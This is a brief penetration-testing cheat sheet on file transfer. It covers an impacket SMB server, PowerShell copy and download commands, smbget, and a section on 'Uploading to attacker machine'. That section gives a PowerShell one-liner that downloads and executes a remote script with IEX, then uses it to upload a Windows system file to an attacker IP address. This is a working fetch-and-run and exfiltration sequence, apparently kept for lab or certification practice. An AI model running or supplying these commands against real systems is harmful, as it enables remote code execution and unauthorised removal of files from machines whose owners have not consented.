# Links to CheatSheets
https://guide.offsecnewbie.com/transferring-files


# SMB Server
```bash
impacket-smbserver share_name /path/to/share
```
copy files
```powershell
Copy-Item -Path "\\10.10.10.10\test\file.txt" -Destination "C:\destination\file.txt"
copy "\\10.10.10.10\test\file.txt"   "C:\destination\file.txt"
```


# From target share
```bash
smbget --recursive smb://10.10.10.100/sharename
```

# Web
```bash
Invoke-WebRequest -Uri $url -OutFile $outputPath
```

## Uploading to attacker machine
```bash
py -m uploadserver
```
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```